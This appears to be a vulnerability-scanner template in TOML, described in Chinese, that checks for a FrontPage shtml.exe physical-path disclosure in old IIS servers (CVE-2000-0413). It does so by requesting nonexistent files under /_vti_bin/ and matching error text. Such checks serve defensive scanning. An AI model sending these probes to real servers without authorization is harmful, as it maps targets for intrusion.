[info]
author = "ave"
description = "通过请求不存在的文件触发 shtml.exe 返回包含服务器物理路径的错误信息，验证 IIS 4.0/5.0 FrontPage 服务器扩展路径泄露漏洞"
id = "POC-AVE-2000-0341"
name = "Microsoft IIS FrontPage shtml.exe 物理路径泄露 PoC"
severity = "medium"
tags = ["ave-2000-0341"]
vuln_id = [
    "CVE-2000-0413",
    "AVE-2000-0341",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/nonexistent.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Path:",
    "物理路径",
    "cannot find",
    "failed to open",
    "shtml.exe",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.dll/nonexistent.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Path:",
    "cannot find",
    "failed to open",
]
